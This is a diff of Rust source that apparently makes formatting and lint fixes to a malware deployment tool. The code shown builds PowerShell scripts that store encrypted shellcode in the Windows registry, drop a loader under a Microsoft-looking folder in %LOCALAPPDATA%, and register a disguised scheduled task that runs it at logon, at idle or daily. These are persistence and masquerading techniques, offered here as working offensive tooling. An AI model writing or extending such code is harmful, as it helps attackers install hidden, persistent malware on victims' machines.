@@ -188,7 +188,7 @@ Write-Host "[+] Size: $($ShellcodeBytes.Length) bytes"
 fn base64_encode(data: &[u8]) -> Vec<u8> {
     const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
-    let mut result = Vec::with_capacity((data.len() + 2) / 3 * 4);
+    let mut result = Vec::with_capacity(data.len().div_ceil(3) * 4);
 
     for chunk in data.chunks(3) {
         let b0 = chunk[0] as usize;
@@ -221,18 +221,14 @@ pub fn generate_scheduled_task_script(
     trigger: TaskTrigger,
 ) -> String {
     let trigger_xml = match trigger {
-        TaskTrigger::OnLogon => {
-            r#"<LogonTrigger>
+        TaskTrigger::OnLogon => r#"<LogonTrigger>
         <Enabled>true</Enabled>
       </LogonTrigger>"#
-                .to_string()
-        }
-        TaskTrigger::OnIdle => {
-            r#"<IdleTrigger>
+            .to_string(),
+        TaskTrigger::OnIdle => r#"<IdleTrigger>
         <Enabled>true</Enabled>
       </IdleTrigger>"#
-                .to_string()
-        }
+            .to_string(),
         TaskTrigger::Daily(hour, minute) => {
             format!(
                 r#"<CalendarTrigger>
@@ -333,7 +329,8 @@ pub fn generate_deployment_script(
     task_name: &str,
     trigger: TaskTrigger,
 ) -> String {
-    let registry_script = generate_registry_script(reg_key_name, reg_value_name, encrypted_shellcode);
+    let registry_script =
+        generate_registry_script(reg_key_name, reg_value_name, encrypted_shellcode);
     let task_script = generate_scheduled_task_script(task_name, loader_path, trigger);
 
     format!(
@@ -414,10 +411,7 @@ pub fn prepare_loader_deployment(
         .map_err(|e| format!("Failed to write loader: {}", e))?;
 
     // Generate deployment script
-    let loader_install_path = format!(
-        "%LOCALAPPDATA%\\Microsoft\\Windows\\{}",
-        loader_name
-    );
+    let loader_install_path = format!("%LOCALAPPDATA%\\Microsoft\\Windows\\{}", loader_name);
     let task_name = format!(
         "Microsoft\\Windows\\{}",
         loader_names[rng.gen_range(0..loader_names.len())]
